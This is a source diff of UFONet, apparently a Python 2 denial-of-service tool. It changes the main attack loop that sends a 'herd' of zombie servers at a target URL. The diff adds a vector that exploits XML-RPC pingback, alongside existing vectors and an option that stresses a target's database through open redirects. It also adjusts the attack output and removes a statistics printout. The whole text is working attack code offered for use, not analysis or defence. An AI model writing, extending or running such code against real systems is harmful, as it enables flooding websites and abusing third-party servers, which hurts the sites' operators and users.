@@ -2606,10 +2170,8 @@ class UFONet(object):
                     if self.options.verbose:
                         traceback.print_exc()
                     head_check_external = False
-                self.head = False
             print '-'*21
             self.external = False
-
         # ask for start the attack
         if head_check_here == True or head_check_external == True:
             if not self.options.forceyes: 
@@ -2649,6 +2211,8 @@ class UFONet(object):
                         send_aliens = self.send_aliens(target)
                     if not self.options.disabledroids and not self.options.attackme: # GET (with parameter required) requests 
                         send_droids = self.send_droids(target)
+                    if not self.options.disablerpcs and not self.options.attackme: # exploit XML-RPC pingback vulnerability 
+                        send_rpcs = self.send_rpcs(target)
                     shuffle(zombies) # suffle zombies order, each round :-)
                     self.herd.reset()
                     print "\n[Info] Sending your 'herd' of zombies...\n"
@@ -2660,12 +2224,13 @@ class UFONet(object):
                         else: # on attackme target url is dynamic -> http://public_ip:port/hash|zombie
                             target = "http://" + str(self.pub_ip) + ":" + self.port + "/"+ str(self.mothership_hash) + "|" + zombie
                             self.options.target = target
-                            if target.startswith("http://") or target.startswith("https://"):
-                                print "Attacking: " + str(self.pub_ip) + ":" + self.port + " -> [LAN]" + self.local_ip + ":" + self.port
-                                print "Payload: " + target
-                                print '='*55, "\n"
+                            print "Attacking: " + str(self.pub_ip) + ":" + self.port + " -> [LAN]" + self.local_ip + ":" + self.port
+                            print "Payload: " + target
+                            print '='*55, "\n"
                         self.attack_mode = True
                         self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+                        if not options.target.startswith('http'):
+                            options.target = "http://" + options.target
                         self.connect_zombies(zombie)
                         if self.options.dbstress: # try to stress db on target by using vulnerable Open Redirect web servers
                             self.db_flash = self.db_flash + 1
@@ -2696,17 +2261,7 @@ class UFONet(object):
                     for z in self.doll.real_zombies: # show only alien verified zombies
                         for x in z:
                             print " - " + str(x)
-                self.herd.dump_html(True)
-                print "-"*21
-                print "="*42
-                print "Troops statistics"
-                print "="*42
-                print "Aliens: " + str(self.total_aliens) + " | Hits: " + str(self.aliens_hit) + " | Fails: " + str(self.aliens_fail)
-                print "Droids: " + str(self.total_droids) + " | Hits: " + str(self.droids_hit) + " | Fails: " + str(self.droids_fail)
-                print "Ucavs : " + str(self.total_ucavs) + " | Hits: " + str(self.ucavs_hit) + " | Fails: " + str(self.ucavs_fail)
-                print "-"*21
-                print "\n" # gui related
-                print '='*21
+                self.herd.dump_html(True) # show (all) zombies statistics
                 if not self.options.attackme:
                     print "\n[Info] - Attack completed! ;-)\n"
                     self.update_mothership_stats() # update mothership stats
